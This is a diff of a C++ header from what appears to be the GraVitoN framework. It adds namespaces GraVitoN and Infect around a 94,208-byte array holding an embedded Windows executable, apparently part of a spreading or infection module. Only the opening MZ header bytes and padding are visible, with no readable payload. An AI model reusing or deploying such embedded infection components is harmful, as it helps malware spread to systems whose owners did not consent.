@@ -29,6 +29,12 @@
 #ifndef _GVN_SPREAD_EOF_DECOM_WIN32_HEAD_
 #define _GVN_SPREAD_EOF_DECOM_WIN32_HEAD_
 
+namespace GraVitoN
+{
+
+namespace Infect
+{
+
 const unsigned long DECOM_EOF_WIN32_SIZE = 94208;
 const unsigned char DECOM_EOF_WIN32[] = 
 "\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
@@ -5921,4 +5927,6 @@ const unsigned char DECOM_EOF_WIN32[] =
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 ;
 
+}
+}
 #endif
